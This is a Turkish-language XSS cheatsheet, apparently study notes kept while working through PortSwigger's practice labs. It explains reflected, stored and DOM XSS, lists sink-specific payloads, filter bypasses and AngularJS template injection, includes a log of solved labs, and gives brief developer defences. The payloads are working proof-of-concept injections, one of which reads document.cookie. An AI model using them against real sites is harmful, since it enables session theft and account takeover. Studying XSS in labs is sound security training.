# XSS (Cross-Site Scripting) Cheatsheet

Kullanıcı girişinden JavaScript enjekte ederek tarayıcıda kod çalıştırma.

## 3 XSS Türü

| Tür | Payload nereye gider? | Kim etkilenir? |
|-----|----------------------|----------------|
| **Reflected** | Sunucuya gidip geri yansır | Sadece linke tıklayan |
| **Stored** | Veritabanına kaydedilir | Sayfayı açan herkes (daha tehlikeli) |
| **DOM** | Sunucuya GİTMEZ — JS doğrudan DOM'a yazıyor | Linke tıklayan |

## Sink Farkları (DOM XSS)

| Sink | `<script>` çalışır mı? | Payload |
|------|------------------------|---------|
| `document.write` | **Evet** (DOM sıfırdan parse edilir) | `"><script>alert(1)</script>` |
| `innerHTML` | **Hayır!** (tarayıcı güvenlik kuralı) | `<img src=x onerror=alert(1)>` |
| `href` attribute | - | `javascript:alert(1)` (tıklamada çalışır) |
| `eval()` | - | JSON/string'den çıkıp JS çalıştır |
| jQuery `$()` | HTML string alınca element oluşturur | `<img onerror=print()>` |

## Payload Tablosu

```
# Temel — encoding/filtre yoksa
<script>alert(1)</script>

# innerHTML sink — script çalışmaz, event handler kullan
<img src=x onerror=alert(1)>

# href attribute — tıklamada çalışır
javascript:alert(document.cookie)

# Attribute'dan çıkış — <> encode ama " encode değilse
" onfocus="alert(1)" autofocus="

# JS string'inden çıkış — var x = 'PAYLOAD';
';alert(1)//

# Container tag'dan çıkış — <select>, <textarea> vb.
</select><script>alert(1)</script>

# AngularJS template injection — ng-app olan sayfada
{{constructor.constructor('alert(1)')()}}

# Reflected DOM XSS — eval+JSON bypass
\"-alert(1)}//
```

## Bypass Teknikleri

| Durum | Bypass |
|-------|--------|
| `<>` encode, `"` encode değil | `" onfocus="alert(1)" autofocus="` |
| `<script>` engelleniyor | `<img>`, `<svg>`, `<body>` event handler'ları |
| JS string içinde | `';alert(1)//` ile string'den çık |
| AngularJS sayfası | `{{ }}` template expression |
| `eval()` + JSON | `\` ile escape bypass, `}` ile object kapat |

## Geliştirici Savunması

```javascript
// JS — input sanitize
DOMPurify.sanitize(userInput)

// React — KULLANMA
dangerouslySetInnerHTML  // XSS riski!

// Sunucu tarafı
// Output encoding: < → &lt;  > → &gt;  " → &quot;
// Content-Security-Policy header
```

## PortSwigger Lab Kaydı

| # | Lab | Tür | Teknik |
|---|-----|-----|--------|
| 1 | Reflected into HTML context | Reflected | `<script>alert(1)</script>` |
| 2 | Stored into HTML context | Stored | Aynı payload, yorum olarak |
| 3 | DOM in document.write | DOM | `"><script>alert(1)</script>` |
| 4 | DOM in innerHTML | DOM | `<img src=x onerror=alert(1)>` |
| 5 | DOM in jQuery href | DOM | `javascript:alert(document.cookie)` |
| 6 | DOM in jQuery selector (hashchange) | DOM | iframe + onload + hash değiştirme |
| 7 | Reflected into attribute | Reflected | `" onfocus="alert(1)" autofocus="` |
| 8 | Stored into anchor href | Stored | `javascript:alert(1)` |
| 9 | Reflected into JS string (angle brackets encoded) | Reflected | `';alert(1)//` |
| 10 | DOM in document.write inside select | DOM | `</select><script>alert(1)</script>` |
| 11 | DOM in AngularJS expression | DOM | `{{constructor.constructor('alert(1)')()}}` |
| 12 | Reflected DOM XSS | DOM | `\"-alert(1)}//` |
